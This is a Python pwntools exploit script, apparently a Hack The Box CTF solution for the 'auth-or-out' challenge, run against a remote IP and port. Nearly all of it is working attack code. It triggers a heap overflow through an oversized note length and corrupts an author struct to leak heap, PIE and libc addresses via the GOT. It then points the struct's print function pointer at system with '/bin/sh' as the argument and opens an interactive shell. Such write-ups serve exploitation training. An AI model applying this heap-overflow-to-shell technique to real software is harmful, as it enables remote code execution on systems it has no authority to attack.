import dataclasses
import ipaddress
import pathlib
import re

from pwnlib.tubes.process import process

from abstract.pwntarget import PwnTarget
from core.target_config import Config, Mode
from core.targetbase import TargetBase
from pwn import p64, u64
from modules.find_function import FindFunction, Method
from modules.get_libc_address import GetLibcAddress


class AuthOrOutPwn(PwnTarget):
    @classmethod
    def main(cls, proc: process, payload: bytes, *args, **kwargs):
        proc.sendline(payload)

    @classmethod
    def input_handler(cls, proc: process, payload: bytes, *args, **kwargs):
        proc.recvline()

    @classmethod
    def create_author(cls, name: bytes, surname: bytes, age: int, note_size: int, data: bytes):
        cls.logger.info(t.process.recvuntil(b':').decode() + "1")
        t.process.sendline(b'1')
        t.process.recvline()
        cls.logger.info(f"{t.process.recvuntil(b':').decode()} {name}")
        t.process.sendline(name)
        cls.logger.info(f"{t.process.recvuntil(b':').decode()} {surname}")
        t.process.sendline(surname)
        cls.logger.info(f"{t.process.recvuntil(b':').decode()} {age}")
        t.process.sendline(str(age).encode())
        cls.logger.info(f"{t.process.recvuntil(b':').decode()} {note_size}")
        t.process.sendline(str(note_size).encode())
        cls.logger.info(f"{t.process.recvuntil(b':').decode()} {data}")
        t.process.sendline(data)
        result = t.process.recvline()
        cls.logger.info(f"{result}")
        match = re.search(r"Author (\d+) added", result.decode())
        if match:
            return match[1]
        return None

    @classmethod
    def delete_author(cls, author_id: str):
        cls.logger.info(t.process.recvuntil(b':').decode() + "4")
        t.process.sendline(b"4")
        cls.logger.info(f"{t.process.recvuntil(b':').decode()} {author_id}")
        t.process.sendline(author_id.encode())
        cls.logger.info(t.process.recvuntil(b'!').decode())

    @classmethod
    def print_author(cls, author_id: str) -> dict:
        cls.logger.info(t.process.recvuntil(b':').decode() + ' 3')
        t.process.sendline(b"3")
        cls.logger.info(f"{t.process.recvuntil(b':').decode()} {author_id}")
        t.process.sendline(author_id.encode())
        cls.logger.info(t.process.recvline())
        cls.logger.info(t.process.recvline())
        cls.logger.info(t.process.recvline())
        name = t.process.recvline()
        surname = t.process.recvline()
        age = t.process.recvline()
        note = t.process.recvline()
        cls.logger.info(name)
        cls.logger.info(surname)
        cls.logger.info(age)
        cls.logger.info(note)
        author = {
            "name": name.split(b' ', maxsplit=1)[1],
            "surname": surname.split(b' ', maxsplit=1)[1],
            "age": age,
            "note": note,
        }
        cls.logger.info(t.process.recvline())
        return author


@dataclasses.dataclass
class Author:
    name: bytes = b''
    surname: bytes = b''
    note_address: int = 0
    age: int = 0
    print_ptr: int = 0

    def deserialize(self) -> bytes:
        return (
            self.name.rjust(16, b'\x41') +
            self.surname.rjust(16, b'\x41') +
            p64(self.note_address) +
            p64(self.age) +
            p64(self.print_ptr)
        )


if __name__ == '__main__':
    config = Config(
        rop=True,
        mode=Mode.remote,
        ip=ipaddress.IPv4Address('167.71.137.186'),
        port=32258,
        file=pathlib.Path('/home/lim8en1/htb/projects-archive/auth-or-out/challenge/auth-or-out'),
        no_offset=True,
        detect_libc=True
    )
    heap_overflow_size = 0xfffffffffffffff9
    t = TargetBase(pwn_target=AuthOrOutPwn, config=config)
    id1 = t.pwn_target.create_author(b'test', b'lololol', 123, 8, data=b'AAAAAAAA')
    id2 = t.pwn_target.create_author(b'test12', b'lolol', 12, 8, data=b'/bin/sh')
    t.pwn_target.delete_author(id1)
    payload_frame = Author(name=b'X' * 16, surname=b'X' * 16)
    id1 = t.pwn_target.create_author(b'test12', b'lolol', 12, heap_overflow_size, data=b'Q' * 16 + payload_frame.deserialize()[:0x20])
    author2 = t.pwn_target.print_author(id2)
    buffer_address_raw = author2['surname'][16:-1]
    buffer_address = u64(buffer_address_raw.ljust(8, b'\0'))
    if buffer_address != 0:
        t.logger.success(f"Heap buffer@{hex(buffer_address)}")
    else:
        t.logger.critical("Failed to find heap buffer address")
        exit(0)
    t.pwn_target.delete_author(id1)

    payload_frame = Author(note_address=buffer_address-8)

    id1 = t.pwn_target.create_author(b'test12', b'lolol', 12, heap_overflow_size,
                        data=b'Q' * 16 + payload_frame.deserialize()[:0x28])
    author2 = t.pwn_target.print_author(id2)
    print_note_address = u64(author2['note'].split(b' ', maxsplit=1)[1][1:-2].ljust(8, b'\0'))
    t.logger.success(f"PrintNote@{hex(print_note_address)}")
    base = print_note_address - t.file.symbols['PrintNote']
    t.file.address = base
    t.logger.success(f"base@{hex(print_note_address)}")

    result = FindFunction.execute(t, 'puts', Method.PLT)
    if not result:
        t.logger.critical(f"Failed to get a print function")
        exit(0)
    print_function_name, print_function_address = result
    result = FindFunction.execute(t, 'puts', Method.GOT)
    if not result:
        t.logger.critical(f"Failed to get a target function")
        exit(0)
    target_function_name, target_function_address = result

    addresses = []

    t.pwn_target.delete_author(id1)
    payload_frame = Author(note_address=target_function_address, print_ptr=print_function_address)
    id1 = t.pwn_target.create_author(b'test12', b'lolol', 12, heap_overflow_size,
                        data=b'Q' * 16 + payload_frame.deserialize())
    author2 = t.pwn_target.print_author(id2)
    address = u64(author2['note'][:-1].ljust(8, b'\0'))
    t.logger.success(f"{target_function_name}@{hex(address)}")
    addresses.append((target_function_name, address))

    result = FindFunction.execute(t, 'printf', Method.GOT)
    if not result:
        t.logger.critical(f"Failed to get a target function")
        exit(0)
    target_function_name, target_function_address = result

    t.pwn_target.delete_author(id1)
    payload_frame = Author(note_address=target_function_address, print_ptr=print_function_address)
    id1 = t.pwn_target.create_author(b'test12', b'lolol', 12, heap_overflow_size,
                        data=b'Q' * 16 + payload_frame.deserialize())
    author2 = t.pwn_target.print_author(id2)
    address = u64(author2['note'][:-1].ljust(8, b'\0'))
    t.logger.success(f"{target_function_name}@{hex(address)}")
    addresses.append((target_function_name, address))

    GetLibcAddress.libc_update_base_address(t, addresses)
    system_ptr = t.libc.symbols['system']
    bin_sh_string = b'/bin/sh\0'
    bin_sh_ptr = next(t.libc.search(bin_sh_string), None)
    if bin_sh_ptr is None:
        t.logger.critical(f"Failed to find /bin/sh in libc")
        exit(0)
    t.pwn_target.delete_author(id1)
    payload_frame = Author(note_address=bin_sh_ptr, print_ptr=system_ptr)
    id1 = t.pwn_target.create_author(b'test12', b'lolol', 12, heap_overflow_size,
                        data=b'Q' * 16 + payload_frame.deserialize())
    t.logger.info(t.process.clean(0.3).decode())
    t.process.sendline(b"3")
    t.process.sendline(id2.encode())
    t.process.interactive()

